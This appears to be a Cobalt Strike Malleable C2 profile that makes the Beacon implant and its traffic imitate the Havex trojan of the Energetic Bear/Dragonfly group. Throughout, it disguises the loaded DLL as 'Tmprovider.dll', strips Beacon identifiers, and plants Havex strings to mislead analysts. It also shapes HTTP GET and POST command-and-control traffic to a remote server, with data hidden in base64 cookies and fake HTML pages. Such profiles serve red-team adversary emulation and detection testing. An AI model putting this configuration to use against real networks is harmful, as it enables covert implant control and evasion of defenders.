# havex trojan C&C profile
# Actor: Energetic Bear / Crouching Yeti / Dragonfly
# 
# See:
# . http://www.symantec.com/connect/blogs/emerging-threat-dragonfly-energetic-bear-apt-group
# . https://securelist.com/files/2014/07/EB-YetiJuly2014-Public.pdf
# . http://pastebin.com/qCdMwtZ6
# . http://www.crowdstrike.com/sites/all/themes/crowdstrike2/css/imgs/platform/CrowdStrike_Global_Threat_Report_2013.pdf
# . https://github.com/Yara-Rules/rules/blob/master/malware/RAT_Havex.yar
# . http://web.archive.org/web/20170808180137/www.f-secure.com/weblog/archives/00002718.html
# . https://www.virustotal.com/#/file/3d3daee1a38e67707921b222f1685d5bd6328af2fc80d4c11d92dc6a6c289261/details
#
# Author: @armitagehacker

set sample_name "HaveX Trojan";

set sleeptime "30000";

set useragent "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08";

set pipename "mypipe-f##";
set pipename_stager "mypipe-h##";

# Clone some header values (Sample from: https://malshare.com/sample.php?action=detail&hash=c6e161a948f4474849d5740b2f27964a)
# ./peclone c6e161a948f4474849d5740b2f27964a
stage {
	set checksum       "0";
	set compile_time   "30 Dec 2013 07:53:48";
	set entry_point    "134733";
	set image_size_x86 "348160";
	set image_size_x64 "348160";
	set name           "Tmprovider.dll";
	set rich_header    "\x63\x02\x25\x0f\x27\x63\x4b\x5c\x27\x63\x4b\x5c\x27\x63\x4b\x5c\x9a\x2c\xdd\x5c\x24\x63\x4b\x5c\x2e\x1b\xde\x5c\x3b\x63\x4b\x5c\x2e\x1b\xcf\x5c\x1b\x63\x4b\x5c\x2e\x1b\xc8\x5c\x8f\x63\x4b\x5c\x00\xa5\x30\x5c\x28\x63\x4b\x5c\x27\x63\x4a\x5c\x97\x63\x4b\x5c\x2e\x1b\xc1\x5c\x60\x63\x4b\x5c\x2e\x1b\xd9\x5c\x26\x63\x4b\x5c\x39\x31\xdf\x5c\x26\x63\x4b\x5c\x2e\x1b\xda\x5c\x26\x63\x4b\x5c\x52\x69\x63\x68\x27\x63\x4b\x5c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

	# disable this little obfuscation
	set stomppe        "false";

	# make these things havex-ish
	transform-x86 {
		strrep "ReflectiveLoader" "RunDllEntry";
		strrep "beacon.dll"       "";
	}

	transform-x64 {
		strrep "ReflectiveLoader" "RunDllEntry";
		strrep "beacon.x64.dll"   "";
	}
	
	# strings gathered from Yara rules and sandbox string dumps
	stringw "%s <%s> (Type=%i, Access=%i, ID='%s')";
	stringw "%02i was terminated by ThreadManager(2)\n";
	stringw "main sort initialise ...\n";
	stringw "qsort [0x%x, 0x%x] done %d this %d\n";
	stringw "{0x%08x, 0x%08x}";
	stringw "Programm was started at %02i:%02i:%02i\n";
	stringw "a+";
	stringw "%02i:%02i:%02i.%04i:";
	stringw "**************************************************************************\n";
	stringw "Start finging of LAN hosts...\n";
	stringw "Finding was fault. Unexpective error\n";
	stringw "Hosts was't found.\n";
	stringw "\t\t\t\t\t%O2i) [%s]\n";
	stringw "Start finging of OPC Servers...";
	stringw "Was found %i OPC Servers.";
	stringw "\t\t%i) [%s\\%s]\n\t\t\tCLSID:          %s\n";
	stringw "\t\t\tUserType:        %s\n\t\t\tVerIndProgID:    %s\n";
	stringw "OPC Servers not found. Programm finished";
	stringw "Start finging of OPC Tags...";
	stringw "[-]Threads number > Hosts number";
	stringw "[-]Can not get local ip";
	stringw "[!]Start";
	stringw "[+]Get WSADATA";
	stringw "[+]Local:"; 
	stringw "[-]Connection error";
	stringw "Was found %i hosts in LAN:";
	stringw "%s[%s]!!!EXEPTION %i!!!";
	stringw "final combined CRC = 0x%08x";
}

http-get {
	set uri "/include/template/isx.php /wp06/wp-includes/po.php /wp08/wp-includes/dtcla.php";

	client {
		header "Referer" "http://www.google.com";
		header "Accept" "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
		header "Accept-Language" "en-us,en;q=0.5";

		# base64 encoded Cookie is not a havex indicator, but a place to stuff our data
		metadata {
			base64;
			header "Cookie";
		}
	}

	server {
		header "Server" "Apache/2.2.26 (Unix)";
		header "X-Powered-By" "PHP/5.3.28";
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html";
		header "Keep-Alive" "timeout=3, max=100";

		output {
			base64;
			prepend "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>Sorry, no data corresponding your request.<!--havex";
			append "havex--></body></html>";
			print;
		}
	}
}

# define indicators for an HTTP POST
http-post {
	set uri "/modules/mod_search.php /blog/wp-includes/pomo/src.php /includes/phpmailer/class.pop3.php";

	client {
		header "Content-Type" "application/octet-stream";

		# transmit our sess id as /whatever.php?id=[identifier]
		id {
			parameter "id";
		}

		# post our output with no real changes
		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Server" "Apache/2.2.26 (Unix)";
		header "X-Powered-By" "PHP/5.3.28";
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html";
		header "Keep-Alive" "timeout=3, max=100";

		# this will just print an empty string, meh...
		output {
			prepend "blah blah blah";
			mask;
			base64;
			prepend "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>Sorry, no data corresponding your request.<!--havex";
			append "havex--></body></html>";
			print;
		}
	}
}
